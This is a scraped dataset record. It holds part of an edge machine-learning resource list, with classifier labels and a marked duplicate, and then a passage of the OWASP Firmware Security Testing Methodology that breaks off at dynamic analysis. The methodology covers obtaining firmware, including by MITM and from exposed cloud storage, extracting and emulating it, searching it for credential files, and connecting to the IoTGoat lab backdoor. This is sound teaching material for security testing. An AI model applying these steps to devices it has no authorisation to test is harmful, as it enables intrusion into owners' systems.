NXP MCUs, i.MX RT crossover MCUs, and i.MX family SoCs. eIQ software includes inference engines, neural network compilers and optimized libraries\neIQ\u2122 Software for Arm\u00ae NN Inference Engine\neIQ\u2122 for Arm\u00ae CMSIS-NN\neIQ\u2122 for Glow Neural Network Compiler\neIQ\u2122 for TensorFlow Lite\nAI Chips\nList of resources about AI Chips\nAI Chip (ICs and IPs)\nA list of ICs and IPs for AI, Machine Learning and Deep Learning\nBooks\nList of books with focus on on-device (e.g., edge or mobile) machine learning.\nTinyML: Machine Learning with TensorFlow on Arduino, and Ultra-Low Power Micro-Controllers\nAuthors: Pete Warden, Daniel Situnayake\nPublished: 2020\nMachine Learning by Tutorials: Beginning machine learning for Apple and iOS\nAuthor: Matthijs Hollemans\nPublished: 2019\nCore ML Survival Guide\nAuthor: Matthijs Hollemans\nPublished: 2018\nBuilding Mobile Applications with TensorFlow\nAuthor: Pete Warden\nPublished: 2017\nChallenges\nLow Power Recognition Challenge (LPIRC)\nCompetition with focus on the best vision solutions that can simultaneously achieve high accuracy in computer vision and energy efficiency. LPIRC is regularly held during computer vision conferences (CVPR, ICCV and others) since 2015 and the winners\u2019 solutions have already improved 24 times in the ratio of accuracy divided by energy.\nOnline Track\nOnsite Track\nOther Resources\nAwesome EMDL\nEmbedded and mobile deep learning research resources\nAwesome Mobile Machine Learning\nA curated list of awesome mobile machine learning resources for iOS, Android, and edge devices\nAwesome Pruning\nA curated list of neural network pruning resources\nEfficient DNNs\nCollection of recent methods on DNN compression and acceleration\nMachine Think\nMachine learning tutorials targeted for iOS devices\nPete Warden's blog\nContribute\nUnlike other awesome list, we are storing data in YAML format and markdown files are generated with awesome.py script.\nEvery directory contains data.yaml which stores data we want to display and config.yaml which stores its metadata (e.g. way of sorting data). The way how data will be presented is defined in renderer.py.\nLicense\nTo the extent possible under law, Bisonai has waived all copyright and related or neighboring rights to this work.", "link": "https://github.com/Bisonai/awesome-edge-machine-learning", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome edge machine learning\na curated list of awesome edge machine learning resources, including research papers, inference engines, challenges, books, meetups and others.\ntable of contents\npapers\napplications\nautoml\nefficient architectures\nfederated learning\nml algorithms for edge\nnetwork pruning\nothers\nquantization\ndatasets\ninference engines\nmcu and mpu software packages\nai chips\nbooks\nchallenges\nother resources\ncontribute\nlicense\npapers\napplications\nthere is a countless number of possible edge machine learning applications. here, we collect papers that describe specific solutions.\nautoml\nautomated machine learning (automl) is the process of automating the end-to-end process of applying machine learning to real-world problems.wikipedia automl is for example used to design new efficient neural architectures with a constraint on a computational budget (defined either as a number of flops or as an inference time measured on real device) or a size of the architecture.\nefficient architectures\nefficient architectures represent neural networks with small memory footprint and fast inference time when measured on edge devices.\nfederated learning\nfederated learning enables mobile phones to collaboratively learn a shared prediction model while keeping all the training data on device, decoupling the ability to do machine learning from the need to store the data in the cloud.google ai blog: federated learning\nml algorithms for edge\nstandard machine learning algorithms are not always able to run on edge devices due to large computational requirements and space complexity. this section introduces optimized machine learning algorithms.\nnetwork pruning\npruning is a common method to derive a compact network \u2013 after training, some structural portion of the parameters is removed, along with its associated computations.importance estimation for neural network pruning\nothers\nthis section contains papers that are related to edge machine learning but are not part of any major group. these papers often deal with deployment issues (i.e. optimizing inference on target platform).\nquantization\nquantization is the process of reducing a precision (from 32 bit floating point into lower bit depth representations) of weights and/or activations in a neural network. the advantages of this method are reduced model size and faster model inference on hardware that support arithmetic operations in lower precision.\ndatasets\nvisual wake words dataset\nvisual wake words represents a common microcontroller vision use-case of identifying whether a person is present in the image or not, and provides a realistic benchmark for tiny vision models. within a limited memory footprint of 250 kb, several state-of-the-art mobile models achieve accuracy of 85-90% on the visual wake words dataset.\ninference engines\nlist of machine learning inference engines and apis that are optimized for execution and/or training on edge devices.\narm compute library\nsource code: https://github.com/arm-software/computelibrary\narm\nbender\nsource code: https://github.com/xmartlabs/bender\ndocumentation: https://xmartlabs.github.io/bender/\nxmartlabs\ncaffe 2\nsource code: https://github.com/pytorch/pytorch/tree/master/caffe2\ndocumentation: https://caffe2.ai/\nfacebook\ncoreml\ndocumentation: https://developer.apple.com/documentation/coreml\napple\ndeeplearning4j\ndocumentation: https://deeplearning4j.org/docs/latest/deeplearning4j-android\nskymind\nembedded learning library\nsource code: https://github.com/microsoft/ell\ndocumentation: https://microsoft.github.io/ell\nmicrosoft\nfeather cnn\nsource code: https://github.com/tencent/feathercnn\ntencent\nmace\nsource code: https://github.com/xiaomi/mace\ndocumentation: https://mace.readthedocs.io/\nxiaomi\nmnn\nsource code: https://github.com/alibaba/mnn\nalibaba\nmxnet\ndocumentation: https://mxnet.incubator.apache.org/versions/master/faq/smart_device.html\namazon\nncnn\nsource code: https://github.com/tencent/ncnn\ntencent\nneural networks api\ndocumentation: https://developer.android.com/ndk/guides/neuralnetworks/\ngoogle\npaddle mobile\nsource code: https://github.com/paddlepaddle/paddle-mobile\nbaidu\nqualcomm neural processing sdk for ai\nsource code: https://developer.qualcomm.com/software/qualcomm-neural-processing-sdk\nqualcomm\ntengine\nsource code: https://github.com/oaid/tengine\noaid\ntensorflow lite\nsource code: https://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite\ndocumentation: https://www.tensorflow.org/lite/\ngoogle\ndabnn\nsource code: https://github.com/jdai-cv/dabnn\njdai computer vision\nmcu and mpu software packages\nlist of software packages for ai development on mcu and mpu\nfp-ai-sensing\nstm32cube function pack for ultra-low power iot node with artificial intelligence (ai) application based on audio and motion sensing\nfp-ai-vision1\nfp-ai-vision1 is an stm32cube function pack featuring examples of computer vision applications based on convolutional neural network (cnn)\nprocessor sdk linux for am57x\ntidl software framework leverages a highly optimized neural network implementation on ti\u2019s sitara am57x processors, making use of hardware acceleration on the device\nx-linux-ai-cv\nx-linux-ai-cv is an stm32 mpu openstlinux expansion package that targets artificial intelligence for computer vision applications based on convolutional neural network (cnn)\ne-ai checker\nbased on the output result from the translator, the rom/ram mounting size and the inference execution processing time are calculated while referring to the information of the selected mcu/mpu\ne-ai translator\n-----> tool !!!  for converting caffe and tensorflow models to mcu/mpu development environment\neiq auto deep learning (dl) toolkit\nthe nxp eiq\u2122 auto deep learning (dl) toolkit enables developers to introduce dl algorithms into their applications and to continue satisfying automotive standards\neiq ml software development environment\nthe nxp\u00ae eiq\u2122 machine learning software development environment enables the use of ml algorithms on nxp mcus, i.mx rt crossover mcus, and i.mx family socs. eiq software includes inference engines, neural network compilers and optimized libraries\neiq\u2122 software for arm\u00ae nn inference engine\neiq\u2122 for arm\u00ae cmsis-nn\neiq\u2122 for glow neural network compiler\neiq\u2122 for tensorflow lite\nai chips\nlist of resources about ai chips\nai chip (ics and ips)\na list of ics and ips for ai, machine learning and deep learning\nbooks\nlist of books with focus on on-device (e.g., edge or mobile) machine learning.\ntinyml: machine learning with tensorflow on arduino, and ultra-low power micro-controllers\nauthors: pete warden, daniel situnayake\npublished: 2020\nmachine learning by tutorials: beginning machine learning for apple and ios\nauthor: matthijs hollemans\npublished: 2019\ncore ml survival guide\nauthor: matthijs hollemans\npublished: 2018\nbuilding mobile applications with tensorflow\nauthor: pete warden\npublished: 2017\nchallenges\nlow power recognition challenge (lpirc)\ncompetition with focus on the best vision solutions that can simultaneously achieve high accuracy in computer vision and energy efficiency. lpirc is regularly held during computer vision conferences (cvpr, iccv and others) since 2015 and the winners\u2019 solutions have already improved 24 times in the ratio of accuracy divided by energy.\nonline track\nonsite track\nother resources\nawesome emdl\nembedded and mobile deep learning research resources\nawesome mobile machine learning\na curated list of awesome mobile machine learning resources for ios, android, and edge devices\nawesome pruning\na curated list of neural network pruning resources\nefficient dnns\ncollection of recent methods on dnn compression and acceleration\nmachine think\nmachine learning tutorials targeted for ios devices\npete warden's blog\ncontribute\nunlike other awesome list, we are storing data in yaml format and markdown files are generated with awesome.py script.\nevery directory contains data.yaml which stores data we want to display and config.yaml which stores its metadata (e.g. way of sorting data). the way how data will be presented is defined in renderer.py.\nlicense\nto the extent possible under law, bisonai has waived all copyright and related or neighboring rights to this work.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000410, "year": null}, {"Unnamed: 0": 417, "autor": 417, "date": null, "content": "description\nFSTM is composed of nine stages tailored to enable security researchers, software developers, hobbyists, and Information Security professionals with conducting firmware security assessments.\nOWASP Firmware Security Testing Methodology\nWhether network connected or standalone, firmware is the center of controlling any embedded device. As such, it is crucial to understand how firmware can be manipulated to perform unauthorized functions and potentially cripple the supporting ecosystem\u2019s security. To get started with performing security testing and reverse engineering of firmware, use the following methodology as guidance when embarking on an upcoming assessment. The methodology is composed of nine stages tailored to enable security researchers, software developers, consultants, hobbyists, and Information Security professionals with conducting firmware security assessments.\nStage Description\n1. Information gathering and reconnaissance Acquire all relative technical and documentation details pertaining to the target device's firmware\n2. Obtaining firmware Attain firmware using one or more of the proposed methods listed\n3. Analyzing firmware Examine the target firmware's characteristics\n4. Extracting the filesystem Carve filesystem contents from the target firmware\n5. Analyzing filesystem contents Statically analyze extracted filesystem configuration files and binaries for vulnerabilities\n6. Emulating firmware Emulate firmware files and components\n7. Dynamic analysis Perform dynamic security testing against firmware and application interfaces\n8. Runtime analysis Analyze compiled binaries during device runtime\n9. Binary Exploitation Exploit identified vulnerabilities discovered in previous stages to attain root and/or code execution\nThe following sections will further detail each stage with supporting examples where applicable. Consider visiting the OWASP Internet of Things Project page and GitHub repository for the latest methodology updates and forthcoming project releases.\nA preconfigured Ubuntu virtual machine (EmbedOS) with firmware testing tools used throughout this document can be downloaded via the following link. Details regarding EmbedOS\u2019 tools can be found on GitHub within the following repository https://github.com/scriptingxss/EmbedOS.\n[Stage 1] Information gathering and reconnaissance\nDuring this stage, collect as much information about the target as possible to understand its overall composition underlying technology. Attempt to gather the following:\nSupported CPU architecture(s)\nOperating system platform\nBootloader configurations\nHardware schematics\nDatasheets\nLines-of-code (LoC) estimates\nSource code repository location\nThird-party components\nOpen source licenses (e.g. GPL)\nChangelogs\nFCC IDs\nDesign and data flow diagrams\nThreat models\nPrevious penetration testing reports\nBug tracking tickets (e.g. Jira and bug bounty platforms such as BugCrowd or HackerOne)\nThe above listed information should be gathered prior to security testing fieldwork via a questionnaire or intake form. Ensure to leverage internal product line development teams to acquire accurate and up to date data. Understand applied security controls as well as roadmap items, known security issues, and most concerning risks. If needed, schedule follow up deep dives on particular features in question. Assessments are most successful within a collaborative environment.\nWhere possible, acquire data using open source intelligence (OSINT) tools and techniques. If open source software is used, download the repository and perform both manual as well as automated static analysis against the code base. Sometimes, open source software projects already use free static analysis tools provided by vendors that provide scan results such as Coverity Scan and Semmle\u2019s LGTM. For example, the screenshots below shows snippets of Das U-Boot\u2019s Coverity Scan results.\nFigure : U-Boot Coverity Scan\nFigure : U-Boot Coverity Scan Analysis\nBelow are screenshots of Dropbear results from LGTM\u2019s analysis.\nFigure : LGTM Dropbear Alerts\nFigure : LGTM Dropbear Results\nWith the information at hand, a light threat model exercise should be performed mapping attack surfaces and impact areas that show the most value in the event of compromise.\n[Stage 2] Obtaining firmware\nTo begin reviewing firmware contents, the firmware image file must be acquired. Attempt to obtain firmware contents using one or more of the following methods:\nDirectly from the development team, manufacturer/vendor or client\nBuild from scratch using walkthroughs provided by the manufacturer\nFrom the vendor's support site\nGoogle dork queries targeted towards binary file extensions and file sharing platforms such as Dropbox, Box, and Google drive\nIt\u2019s common to come across firmware images through customers who upload contents to forums, blogs, or comment on sites where they contacted the manufacturer to troubleshoot an issue and were given firmware via a zip or flash drive sent.\nMan-in-the-middle (MITM) device communication during updates\n*Download builds from exposed cloud provider storage locations such as Amazon Web Services (AWS) S3 buckets\nExtract directly from hardware via UART, JTAG, PICit, etc.\nSniff serial communication within hardware components for update server requests\nVia a hardcoded endpoint within the mobile or thick applications\nDumping firmware from the bootloader (e.g. U-boot) to flash storage or over the network via tftp\nRemoving the flash chip (e.g. SPI) or MCU from the board for offline analysis and data extraction (LAST RESORT).\nYou will need a supported chip programmer for flash storage and/or the MCU.\n*Note: Ensure to follow local laws and regulations when downloading data from exposed cloud provider storage services.\nEach of the listed methods vary in difficulty and should not be considered an exhaustive list. Select the appropriate method according to the project objectives and rules of engagement. If possible, request both a debug build and release build of firmware to maximize testing coverage use cases in the event debug code or functionality is compiled within a release.\n[Stage 3] Analyzing firmware\nOnce the firmware image is obtained, explore aspects of the file to identify its characteristics. Use the following steps to analyze firmware file types, potential root filesystem metadata, and gain additional understanding of the platform it's compiled for.\nLeverage utilities such as:\nfile <bin>\nstrings\nstrings -n5 <bin>\nstrings -n16 <bin>#longer than 16\nstrings -tx <bin> #print offsets in hex\nbinwalk <bin>\nhexdump -C -n 512 <bin> > hexdump.out\nhexdump -C <bin> | head # might find signatures in header\nfdisk -lu <bin> #lists a drives partition and filesystems if multiple\nIf none of the above methods provide any useful data, the following is possible:\nBinary may be BareMetal\nBinary may be for a real time operating system (RTOS) platform with a custom filesystem\nBinary may be encrypted\nIf the binary may be encrypted, check the entropy using binwalk with the following command:\n$ binwalk -E <bin>\nLow entropy = Not likely to be encrypted\nHigh entropy = Its likely encrypted (or compressed in some way).\nAlternate tools are also available using Binvis online and the standalone application.\nBinvis\nhttps://code.google.com/archive/p/binvis/\nhttps://binvis.io/#/\n[Stage 4] Extracting the filesystem\nThis stage involves looking inside firmware and parsing relative filesystem data to start identifying as many potential security issues as possible. Use the following steps to extract firmware contents for review of uncompiled code and device configurations used in following stages. Both automated and manual extractions methods are shown below.\nUse the following tools and methods to extract filesystem contents:\n$ binwalk -ev <bin>\nFiles will be extracts to \" _binaryname/filesystemtype/\"\nFilesystem types: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs\n2a. Sometimes, binwalk will not have the magic byte of the filesystem in its signatures. In these cases, use binwalk to find the offset of the filesystem and carve the compressed filesystem from the binary and manually extract the filesystem according to its type using the steps below.\n$ binwalk DIR850L_REVB.bin\nDECIMAL HEXADECIMAL DESCRIPTION\n----------------------------------------------------------------------------- ---\n0 0x0 DLOB firmware header, boot partition: \"\"\"\"dev=/dev/mtdblock/1\"\"\"\"\n10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes\n1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes\n1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41\n2b. Run the following dd command carving the Squashfs filesystem.\n$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs\n8257536+0 records in\n8257536+0 records out\n8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s\nAlternatively, the following command could also be run.\n$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs\n2c. For squashfs (used in the example above)\n$ unsquashfs dir.squashfs\nFiles will be in \"squashfs-root\" directory afterwards.\n2d. CPIO archive files\n$ cpio -ivd --no-absolute-filenames -F <bin>\n2f. For jffs2 filesystems\n$ jefferson rootfsfile.jffs2\n2d. For ubifs filesystems with NAND flash\n$ ubireader_extract_images -u UBI -s <start_offset> <bin>\n$ ubidump.py <bin>\n[Stage 5] Analyzing filesystem contents\nDuring this stage, clues are gathered for dynamic and runtime analysis stages. Investigate if the target firmware contains the following (non-exhaustive):\nLegacy insecure network daemons such as telnetd (sometimes manufactures rename binaries to disguise )\nHardcoded credentials (usernames, passwords, API keys, SSH keys, and backdoor variants )\nHardcoded API endpoints and backend server details\nUpdate server functionality that could be used as an entry point\nReview uncompiled code and start up scripts for remote code execution\nExtract compiled binaries to be used for offline analysis with a disassembler for future steps\nStatically analyze filesystem contents and uncompiled code manually or leveraging automation tools such as firmwalker that parse the following:\netc/shadow and etc/passwd\nlist out the etc/ssl directory\nsearch for SSL related files such as .pem, .crt, etc.\nsearch for configuration files\nlook for script files\nsearch for other .bin files\nlook for keywords such as admin, password, remote, AWS keys, etc.\nsearch for common web servers used on IoT devices\nsearch for common binaries such as ssh, tftp, dropbear, etc.\nsearch for banned c functions\nsearch for common command injection vulnerable functions\nsearch for URLs, email addresses and IP addresses\nand more\u2026\nThe following subsections introduce open source automated firmware analysis tools.\nFirmwalker\nExecute firmwalker within it\u2019s directory in ~/tools/firmwalker and point firmwalker to the absolute path of the extracted filesystem\u2019s root directory. Firmwalker uses information in the \"/data/\u201d directory for parsing rules. A custom fork modified by Aaron Guzman with additional checks can be found on GitHub at https://github.com/scriptingxss/firmwalker. The following examples show the usage of firmwalker used on OWASP\u2019s IoTGoat. Additional vulnerable firmware projects are listed in the Vulnerable firmware section at the end of the document.\n$ ./firmwalker.sh /home/embedos/firmware/ _IoTGoat-rpi-2.img.extracted/squashfs-root/\nSee the firmwalker output below.\nTwo files will be generated, firmwalker.txt and firmwalkerappsec.txt. These output files should be manually reviewed.\nFirmware Analysis Comparison Toolkit (FACT )\nFortunately, multiple open source automated firmware analysis tools are available. FACT features include the following:\nIdentification of software components such as operating system, CPU architecture, and third-party components along with their associated version information\nExtraction of firmware filesystem (s ) from images\nDetection of certificates and private keys\nDetection of weak implementations mapping to Common Weakness Enumeration (CWE)\nFeed & signature-based detection of vulnerabilities\nBasic static behavioral analysis\nComparison (diff) of firmware versions and files\nUser mode emulation of filesystem binaries using QEMU\nDetection of binary mitigations such as NX, DEP, ASLR, stack canaries, RELRO, and FORTIFY_SOURCE\nREST API\nand more...\nBelow are instructions for using firmware analysis comparison toolkit within the companion preconfigured virtual machine.\nTip: It is recommended to run FACT with a computer that has 16 Cores 64GB RAM although the tool can run with a minimum of 4 cores and 8GB of RAM at a much slower pace. Scan output results vary on the allocated resources given to the virtual machine. The more resources, the faster FACT will complete scan submissions.\n$ cd ~/tools/FACT_core/\n$ sudo ./start_all_installed_fact_components\nNavigate to http://127.0.0.1:5000 in browser\nFigure : FACT Dashboard\nUpload firmware components to FACT for analysis. In the screenshot below, the compressed complete firmware with its root filesystem will be uploaded and analyzed.\nFigure : FACT Upload\nDepending on the hardware resources given to FACT, the analysis results will appear with its scan results upon a given time. This process can take hours if minimal resources are allocated.\nFigure : FACT IoTGoat\nFigure : FACT IoTGoat Exploit Mitigation Results\nDisassemble suspect target binaries with data gathered from FACT using IDA Pro, Ghidra, Hopper, Capstone, or Binary Ninja. Analyze binaries for potential remote code execution system calls, strings, function lists, memory corruption vulnerabilities, and identify Xrefs to system() or alike function calls. Note potential vulnerabilities to use for upcoming steps.\nThe following screenshot shows the \u201cshellback\u201d binary disassembled using Ghidra.\nFigure : Shellback Ghidra Analysis\nCommon binary analysis consist of reviewing the following:\nStack canaries enabled or disabled\n$ readelf -aW bin/*| grep stack_chk_fail\n$ mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack_chk_fail\nPosition-independent executable (PIE) enabled or disabled\nPIE disabled\n$ readelf -h <bin> | grep -q 'Type:[[:space:]]*EXEC'\nPIE enabled\n$ readelf -h <bin> | grep 'Type:[[:space:]]*DYN'\nDSO\n$ readelf -d <bin> | grep -q 'DEBUG'\nSymbols\n$ readelf --syms <bin>\n$ nm <bin>\nRecognizable strings\n-el specifies little-endian characters 16-bits wide (e.g. UTF-16).\nUse -eb for big endian\nPrints any ASCII strings longer than 16 to stdout\nThe -t flag will return the offset of the string within the file.\n-tx will return it in hex format, T-to in octal and -td in decimal.\nUseful for cross-referencing with a hex editor, or want to know where in the file your string is.\nstrings -n5 <bin>\nstrings -el <bin>\nstrings -n16 <bin>\nstrings -tx <bin>\nNon-executable (NX) enabled or disabled\n$ readelf -lW bin/<bin>| grep STACK\nGNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4\nThe 'E' indicates that the stack is executable.\n$ execstack bin/*\nX bin/ash\nX bin/busybox\nRelocations read-only (RELRO) configuration\nFull RELRO:\n$ readelf -d binary | grep BIND_NOW\nPartial RELRO:\n$ readelf -d binary | grep GNU_RELRO\nA script that automates checking many of the above binary properties is checksec.sh. Below, are two examples of using the script.\n> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox\nRELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE\nPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 0 /home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox\n> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback\nRELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE\nPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 0 /home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback\nFigure : Checksec.sh\nFor Microsoft binaries (EXE & DLL), use PESecurity to check for ASLR, DEP, SafeSEH, StrongNaming, Authenticode, Control Flow Guard, and HighEntropyVA.\n[Stage 6] Emulating firmware\nUsing details and clues identified in previous steps, firmware as well as it\u2019s encapsulated binaries must be emulated to verify potential vulnerabilities. To accomplish emulating firmware, there are a few approaches listed below.\nPartial emulation (user space) - Emulation of standalone binaries derived from a firmware's extracted filesystem such as /usr/bin/shellback\nFull system emulation - Emulation of the full firmware and start up configurations leveraging fake NVRAM.\nEmulation using a real device or virtual machine - At times, partial or full emulation may not work due to a hardware or architecture dependencies. If the architecture and endianness match a device owned such as a raspberry pie, the root filesystem or specific binary can be transferred to the device for further testing. This method also applies to pre built virtual machines using the same architecture and endianness as the target.\nPartial Emulation (user-mode emulation)\nTo begin partially emulating binaries, the CPU architecture and endianness must be known for selecting the appropriate QEMU emulation binary in the following steps.\n$ binwalk -Y <bin>\n$ readelf -h <bin>\nel - little endian\neb - big endian\nBinwalk can be used identify endianness for packaged firmware binaries (not from binaries within extracted firmware) using the command below.\n$ binwalk -Y UPG_ipc8120p-w7-M20-hi3516c-20160328_165229.ov\nDECIMAL HEXADECIMAL DESCRIPTION\n--------------------------------------------------------------------------------\n3480 0xD98 ARM executable code, 32-bit, little endian, at least 1154 valid instructions\nAfter the CPU architecture and endianness have been identified, locate the appropriate QEMU binary to perform partial emulation (Not for emulating the full firmware, but binaries with the extracted firmware.)\nTypically, in:\n/usr/local/qemu-arch or /usr/bin/qemu-arch\nCopy the applicable QEMU binary into the extracted root filesystem. The second command shows copying the static arm QEMU binary to the extracted root filesystem within a ZSH shell showing the absolute path.\n> cp /usr/local/qemu-arch /extractedrootFS/\n/home/embedos/firmware/_DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted.extracted/squashfs-root\n> cp /usr/bin/qemu-arm-static .\nExecute the ARM binary (or appropriate arch) to emulate using QEMU and chroot with the following command:\n$ sudo chroot . ./qemu-arch <binarytoemulate>\nThe following example shows Busybox emulated within a typical x64 architecture an attacker machine is likely using.\n> sudo chroot . ./qemu-arm-static bin/busybox ls\n[sudo] password for embedos:\nbin etc overlay rom sys var\ndev lib proc root tmp www\ndnsmasq_setup.sh mnt qemu-arm-static sbin usr\nBelow, is an example of emulating a service that listens on port 5515.\n> sudo chroot . ./qemu-arm-static usr/bin/shellback\nAlso, the same service can be emulated with qiling framework.\n> ./qltool run --console False -f ~/_IoTGoat-x86.img.extracted/squashfs-root/usr/bin/shellback --rootfs ~/_IoTGoat-x86.img.extracted/squashfs-root\nIn another terminal, check if the service is listening locally and try to connect to it with netcat.\n> sudo lsof -i :5515\nCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\nqemu-arm- 13264 root 3u IPv4 662221 0t0 TCP *:5515 (LISTEN)\n> nc -nv 127.0.0.1 5515\nConnection to 127.0.0.1 5515 port [tcp/*] succeeded!\n[***]Successfully Connected to IoTGoat's Backdoor[***]\nSometimes, requests are dispatched to the CGI binary by the HTTP server. By simply emulating the CGI binary, it's possible to analyze the process procedure or verify the vulnerability without setting up a HTTP server. The following example issues a GET request to a MIPS CGI binary.\n~/DIR850L/squashfs-root/htdocs/web$ ls -l captcha.cgi\nlrwxrwxrwx 1 root root 14 Oct 17 2017 captcha.cgi -> /htdocs/cgibin\n# fix the broken symbolic link\n~/DIR850L/squashfs-root/htdocs/web$ rm captcha.cgi && ln -s ../cgibin captcha.cgi\n~/DIR850L/squashfs-root$ sudo chroot . ./qemu-mips-static -E REQUEST_METHOD=\"GET\" -E REQUEST_URI=\"/captcha.cgi\" -E REMOTE_ADDR=\"192.168.1.1\" -E CONTENT_TYPE=\"text/html\" /htdocs/web/captcha.cgi\nHTTP/1.1 200 OK\nContent-Type: text/xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?><captcha>\n<result>FAIL</result><message>NO SESSION</message>\n</captcha>\nWith the target binary emulated, interact with its interpreter or listening service. Fuzz its application and network interfaces as noted in the next phase.\nFull-system Emulation\nWhen possible, use automation tools such as firmadyne, firmware analysis toolkit, or ARM-X Firmware Emulation Framework to perform full emulation of firmware. These tools are essentially wrappers for QEMU and other environmental functions such as nvram.\nhttps://github.com/attify/firmware-analysis-toolkit\nhttps://github.com/therealsaumil/armx/\nhttps://github.com/getCUJO/MIPS-X\nhttps://github.com/firmadyne/firmadyne\nhttps://github.com/qilingframework/qiling#qltool\nUsing firmware analysis toolkit, simply execute the following command:\nsudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0\n__ _\n/ _| | |\n| |_ __ _ | |_\n| _| / _` | | __|\n| | | (_| | | |_\n|_| \\__,_| \\__|\nWelcome to the Firmware Analysis Toolkit - v0.3\nOffensive IoT Exploitation Training http://bit.do/offensiveiotexploitation\nBy Attify - https://attify.com | @attifyme\n[+] Firmware: IoTGoat-rpi-2.img\n[+] Extracting the firmware...\n[+] Image ID: 1\n[+] Identifying architecture...\n[+] Architecture: armel\n[+] Building QEMU disk image...\n[+] Setting up the network connection, please standby...\n[+] Network interfaces: [('eth0', '192.168.1.1')]\n[...]\nAdding route to 192.168.1.1...\nStarting firmware emulation... use Ctrl-a + x to exit\n[ 0.000000] Booting Linux on physical CPU 0x0\n[ 0.000000] Linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:05:21 UTC 2016\n[ 0.000000] CPU: ARMv7 Processor [412fc0f1] revision 1 (ARMv7), cr=10c5387d\n[ 0.000000] CPU: PIPT / VIPT nonaliasing data cache, PIPT instruction cache\nBusyBox v1.28.4 () built-in shell (ash)\n.--,\\\\\\__\n\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 `-. a`-.__\n\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 | ')\n\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d / \\ _.-'-,`;\n\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d / | { /\n\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551 / | { /\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d ..-\"``~\"-' ; )\n\u2566\u250c\u2500\u2510\u2554\u2566\u2557\u2554\u2550\u2557\u250c\u2500\u2510\u250c\u2500\u2510\u250c\u252c\u2510 ;' `\n\u2551\u2502 \u2502 \u2551 \u2551 \u2566\u2502 \u2502\u251c\u2500\u2524 \u2502 ;' `\n\u2569\u2514\u2500\u2518 \u2569 \u255a\u2550\u255d\u2514\u2500\u2518\u2534 \u2534 \u2534 ;' `\n------------------------------------------------------------ ;'\nGitHub: https://github.com/OWASP/IoTGoat\n------------------------------------------------------------\nroot@IoTGoat:/#\nNote: Modifications to these tools may be required if the firmware contains an uncommon compression, filesystem, or unsupported architecture.\n[Stage 7] Dynamic analysis\nIn this stage, perform dynamic testing while a device is running in its normal or emulated environment. Objectives in this stage may vary depending on the project and level of access given. Typically, this involves tampering of bootloader configurations, web and API testing, fuzzing (network and application services), as well as active scanning using various toolsets to acquire elevated access (root) and/or code execution.\nTools that may be helpful are (non-exhaustive):\nBurp Suite\nOWASP ZAP\nCommix\nFuzzers such as - American fuzzy loop (AFL)\nNetwork and protocol fuzzers such as - Mutiny, boofuzz, and kitty.\nNmap\nNCrack\nMetasploit\nEmbedded web application testing\nReference industry standard web methodologies such as OWASP\u2019s Testing 